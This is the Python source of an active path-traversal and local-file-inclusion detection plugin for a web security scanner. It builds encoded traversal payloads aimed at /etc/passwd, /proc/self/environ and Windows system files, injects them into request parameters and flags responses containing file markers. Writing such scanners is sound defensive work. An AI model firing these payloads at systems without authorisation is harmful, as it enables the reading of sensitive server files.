"""
Enterprise Path Traversal Detection Plugin.

Emits DetectionCandidate objects for centralized verification.
"""
import re
import urllib.parse
import time
from typing import List, Union, Dict

import structlog

from ...interfaces.active import ActivePluginInterface
from ...passive.models import PluginMetadata
from ...network.http.manager import HTTPClientManager
from ...network.models import HTTPRequest, HTTPResponse
from ...models.finding import Finding, Evidence, VerificationStatus, Severity, Confidence
from ...crawler.models import Endpoint
from ..models import DetectionCandidate, BaselineResult, Payload, PayloadTechnique
from ..mutator import EnterpriseRequestMutator


logger = structlog.get_logger(__name__)

FILE_MARKERS = {
    "linux": {
        "/etc/passwd": [(r"root:.:0:0:", "/etc/passwd root entry")],
        "/proc/self/environ": [(r"PATH=|HOME=|USER=", "/proc/self/environ variables")],
    },
    "windows": {
        "win.ini": [(r"\[extensions\]", "win.ini extensions section")],
        "hosts": [(r"127\.0\.0\.1\s+localhost", "hosts file localhost entry")],
    },
}

def _generate_payloads() -> List[Dict]:
    payloads = []
    linux_files = [("../../../../etc/passwd", "/etc/passwd"), ("../../../../proc/self/environ", "/proc/self/environ")]
    windows_files = [("..\\..\\..\\..\\windows\\win.ini", "win.ini"), ("..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "hosts")]

    for p, f in linux_files: payloads.append({"value": p, "encoding": "none", "platform": "linux", "target_file": f})
    for p, f in windows_files: payloads.append({"value": p, "encoding": "none", "platform": "windows", "target_file": f})

    for p, f in linux_files:
        payloads.append({"value": p.replace("../", "%2e%2e%2f"), "encoding": "url", "platform": "linux", "target_file": f})
        payloads.append({"value": p.replace("../", "%252e%252e%252f"), "encoding": "double_url", "platform": "linux", "target_file": f})
        payloads.append({"value": p.replace("../", "%c0%ae%c0%ae/"), "encoding": "unicode", "platform": "linux", "target_file": f})
        payloads.append({"value": p + "%00.jpg", "encoding": "null_byte", "platform": "linux", "target_file": f})
        payloads.append({"value": p.replace("/", "\\/"), "encoding": "mixed", "platform": "linux", "target_file": f})
        payloads.append({"value": p + "....//", "encoding": "wrapper", "platform": "linux", "target_file": f})
        payloads.append({"value": p + "..././", "encoding": "wrapper", "platform": "linux", "target_file": f})
        payloads.append({"value": p + ".../", "encoding": "wrapper", "platform": "linux", "target_file": f})
        payloads.append({"value": p + "...\\\\", "encoding": "wrapper", "platform": "linux", "target_file": f})

    return payloads


class PathTraversalPlugin(ActivePluginInterface):
    """Enterprise Path Traversal detector emitting unverified candidates."""

    PAYLOAD_DEFS = _generate_payloads()

    @property
    def metadata(self) -> PluginMetadata:
        return PluginMetadata(
            id="ACT-TRAV-001",
            name="Path Traversal / Local File Inclusion",
            description="Detects path traversal candidates for centralized verification.",
        )

    async def execute(self, endpoint: Union[str, Endpoint], http_manager: HTTPClientManager) -> List[DetectionCandidate]:
        candidates = []
        client = http_manager.get_shared_client()
        endpoint_url = endpoint.url if not isinstance(endpoint, str) else endpoint
        mutator = EnterpriseRequestMutator()

        params = self._get_params(endpoint)
        if not params: return candidates

        baseline = await self._capture_baseline(client, endpoint_url)
        baseline_text = baseline.response.text if baseline and baseline.response and isinstance(baseline.response.text, str) else ""
        baseline_has_markers = self._check_all_markers(baseline_text)

        vulnerable_params = set()

        for param_name in params:
            if param_name in vulnerable_params: continue

            for payload_def in self.PAYLOAD_DEFS:
                if param_name in vulnerable_params: break

                payload = Payload(
                    value=payload_def["value"],
                    technique=PayloadTechnique.FILE_READ,
                    category="path_traversal",
                    metadata={"platform": payload_def["platform"], "target_file": payload_def["target_file"], "encoding": payload_def["encoding"]},
                )

                case = next((tc for tc in mutator.mutate(endpoint, [payload]) if tc.mutated_parameter == param_name), None)
                if not case: continue

                resp = await client.send(case.request)
                resp_text = resp.text if isinstance(resp.text, str) else ""

                platform = payload_def["platform"]
                target_file = payload_def["target_file"]
                markers = self._get_markers(platform, target_file)

                for pattern, desc in markers:
                    if re.search(pattern, resp_text, re.IGNORECASE):
                        if baseline_has_markers and re.search(pattern, baseline_text, re.IGNORECASE):
                            continue

                        candidate = DetectionCandidate(
                            plugin_id=self.metadata.id,
                            vulnerability_type="path_traversal",
                            technique=PayloadTechnique.FILE_READ,
                            endpoint=endpoint_url,
                            parameter=param_name,
                            payload=payload,
                            baseline=baseline,
                            fuzzed_request=case.request,
                            fuzzed_response=resp,
                            file_marker=pattern,
                        )
                        candidates.append(candidate)
                        vulnerable_params.add(param_name)
                        break

        return candidates

    def _get_params(self, endpoint: Union[str, Endpoint]) -> Dict[str, str]:
        if isinstance(endpoint, str):
            parsed = urllib.parse.urlparse(endpoint)
            return dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
        return endpoint.parameters or {}

    async def _capture_baseline(self, client, url: str) -> BaselineResult:
        try:
            req = HTTPRequest(method="GET", url=url)
            start = time.monotonic()
            resp = await client.send(req)
            elapsed = (time.monotonic() - start) * 1000
            return BaselineResult(request=req, response=resp, response_time_ms=elapsed)
        except Exception as e:
            return BaselineResult(request=HTTPRequest(method="GET", url=url), error=str(e))

    def _get_markers(self, platform: str, target_file: str) -> List[tuple]:
        return FILE_MARKERS.get(platform, {}).get(target_file, [])

    def _check_all_markers(self, text: str) -> bool:
        for p_m in FILE_MARKERS.values():
            for f_m in p_m.values():
                for pat, _ in f_m:
                    if re.search(pat, text, re.IGNORECASE): return True
        return False
